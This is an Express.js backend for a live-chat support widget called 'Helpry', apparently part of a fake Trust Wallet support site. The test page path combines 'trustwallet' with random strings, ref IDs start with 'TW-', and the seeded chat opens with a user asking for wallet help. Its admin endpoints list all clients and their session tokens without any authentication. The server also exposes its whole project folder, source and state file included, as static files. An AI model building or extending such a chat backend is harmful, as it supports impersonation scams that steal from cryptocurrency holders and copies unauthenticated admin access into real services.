const express = require('express');
const multer = require('multer');
const path = require('path');
const crypto = require('crypto');
const store = require('./lib/store');

const app = express();
const PORT = process.env.PORT || 5500;
const ROOT = __dirname;

const upload = multer({ storage: multer.memoryStorage() });

function makeCacheLock() {
  return crypto.randomBytes(24).toString('hex');
}

function getClientByCacheLock(state, cacheLock) {
  return state.clients.find(client => client.cache_lock === cacheLock) || null;
}

function getClientById(state, clientId) {
  const id = Number(clientId);
  return state.clients.find(client => client.id === id) || null;
}

function sanitizeMessage(msg) {
  return {
    id: msg.id,
    sender_type: msg.sender_type,
    message: msg.message || '',
    image_urls: Array.isArray(msg.image_urls) ? msg.image_urls : [],
    created_at: msg.created_at || new Date().toISOString()
  };
}

function listClientMessages(client) {
  const list = Array.isArray(client.messages) ? client.messages : [];
  return list.slice().sort((a, b) => new Date(a.created_at) - new Date(b.created_at)).map(sanitizeMessage);
}

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(ROOT));

app.get('/health', (req, res) => {
  res.json({ ok: true, status: 'running', port: PORT, storage: store.isUsingKV() ? 'vercel-kv' : 'file' });
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(ROOT, 'admin.html'));
});

app.get('/api/admin/clients', async (req, res) => {
  const state = await store.getState();
  res.json({
    success: true,
    clients: state.clients.map(client => ({
      id: client.id,
      ref_id: client.ref_id,
      helpry_id: client.helpry_id,
      country: client.country,
      cache_lock: client.cache_lock,
      created_at: client.created_at,
      messages: listClientMessages(client)
    }))
  });
});

app.post('/api/register-client', async (req, res) => {
  const { helpry_id, country } = req.body || {};

  if (!helpry_id) {
    return res.status(400).json({ success: false, error: 'Missing helpry_id' });
  }

  const state = await store.getState();
  const client = {
    id: state.nextClientId++,
    ref_id: `TW-${String(state.nextClientId - 1).padStart(5, '0')}`,
    helpry_id: Number(helpry_id),
    country: country || 'Unknown',
    cache_lock: makeCacheLock(),
    created_at: new Date().toISOString(),
    messages: []
  };

  state.clients.push(client);
  await store.saveState(state);

  res.json({
    success: true,
    client: {
      id: client.id,
      ref_id: client.ref_id,
      helpry_id: client.helpry_id,
      country: client.country,
      cache_lock: client.cache_lock
    }
  });
});

app.post('/api/verify-cache-lock', async (req, res) => {
  const { cache_lock } = req.body || {};

  if (!cache_lock) {
    return res.status(400).json({ valid: false, reason: 'Missing cache_lock' });
  }

  const state = await store.getState();
  const client = getClientByCacheLock(state, cache_lock);
  if (!client) {
    return res.json({ valid: false, reason: 'invalid cache lock' });
  }

  return res.json({
    valid: true,
    client: {
      id: client.id,
      ref_id: client.ref_id,
      helpry_id: client.helpry_id,
      country: client.country,
      cache_lock: client.cache_lock
    }
  });
});

app.post('/api/messages/fetch', async (req, res) => {
  const { cache_lock } = req.body || {};

  if (!cache_lock) {
    return res.status(400).json({ success: false, error: 'Missing cache_lock' });
  }

  const state = await store.getState();
  const client = getClientByCacheLock(state, cache_lock);
  if (!client) {
    return res.status(404).json({ success: false, error: 'Session not found' });
  }

  return res.json({
    success: true,
    messages: listClientMessages(client)
  });
});

app.post('/api/messages/send', upload.array('images[]', 3), async (req, res) => {
  const { cache_lock, message } = req.body || {};

  if (!cache_lock) {
    return res.status(400).json({ success: false, error: 'Missing cache_lock' });
  }

  const state = await store.getState();
  const client = getClientByCacheLock(state, cache_lock);
  if (!client) {
    return res.status(404).json({ success: false, error: 'Session not found' });
  }

  const msgText = (message || '').trim();
  if (!msgText && (!req.files || req.files.length === 0)) {
    return res.status(400).json({ success: false, error: 'Empty message' });
  }

  // NOTE: image persistence (saving uploaded files / returning URLs) is intentionally
  // left minimal for the local demo. On Vercel you would persist images to Blob storage
  // and store the resulting URLs in image_urls. The client UI already renders image_urls.
  const image_urls = [];

  const newMessage = {
    id: state.nextMessageId++,
    sender_type: 'client',
    message: msgText,
    image_urls,
    created_at: new Date().toISOString()
  };

  client.messages = client.messages || [];
  client.messages.push(newMessage);
  await store.saveState(state);

  return res.json({
    success: true,
    message: sanitizeMessage(newMessage)
  });
});

app.post('/api/admin/reply', async (req, res) => {
  const { client_id, message } = req.body || {};

  if (!client_id) {
    return res.status(400).json({ success: false, error: 'Missing client_id' });
  }

  const state = await store.getState();
  const client = getClientById(state, client_id);
  if (!client) {
    return res.status(404).json({ success: false, error: 'Client not found' });
  }

  const msgText = (message || '').trim();
  if (!msgText) {
    return res.status(400).json({ success: false, error: 'Message is empty' });
  }

  const reply = {
    id: state.nextMessageId++,
    sender_type: 'admin',
    message: msgText,
    image_urls: [],
    created_at: new Date().toISOString()
  };

  client.messages = client.messages || [];
  client.messages.push(reply);
  await store.saveState(state);

  return res.json({
    success: true,
    message: sanitizeMessage(reply)
  });
});

app.get('/api/admin/seed-demo', async (req, res) => {
  const state = await store.getState();
  if (state.clients.length > 0) {
    return res.json({ success: true, message: 'Demo already created', clients: state.clients.length });
  }

  const demoClient = {
    id: state.nextClientId++,
    ref_id: 'TW-00001',
    helpry_id: 8484,
    country: 'United States',
    cache_lock: 'demo-cache-lock-helpry-0001',
    created_at: new Date().toISOString(),
    messages: [
      {
        id: state.nextMessageId++,
        sender_type: 'client',
        message: 'Hi, I need help with my wallet.',
        image_urls: [],
        created_at: new Date().toISOString()
      }
    ]
  };

  state.clients.push(demoClient);
  await store.saveState(state);

  return res.json({ success: true, client: demoClient });
});

app.use((req, res) => {
  if (req.method !== 'GET') {
    return res.status(405).json({ success: false, error: 'Method not allowed for this endpoint.' });
  }

  const fallback = path.join(ROOT, req.path.replace(/^\//, ''));
  if (fsExistsSafe(fallback)) {
    return res.sendFile(fallback);
  }

  return res.status(404).json({ success: false, error: 'Not found' });
});

function fsExistsSafe(p) {
  try {
    // eslint-disable-next-line no-sync
    return require('fs').existsSync(p) && require('fs').statSync(p).isFile();
  } catch (e) {
    return false;
  }
}

// Export the app so Vercel's serverless function (api/index.js) can reuse it.
// `npm start` / `node server.js` still listens and serves locally.
if (require.main === module) {
  app.listen(PORT, () => {
    console.log(`Helpry local chat server is running on http://127.0.0.1:${PORT}`);
    console.log('Storage backend:', store.isUsingKV() ? 'Vercel KV' : 'local file (data/state.json)');
    console.log('Open http://127.0.0.1:5500/helpry.jp/cmupnn-trustwallet-xostfj-helpry-eohlok-trustwallet-gkqtyx.html to test the widget');
    console.log('Open http://127.0.0.1:5500/admin to manage chats');
  });
}

module.exports = app;
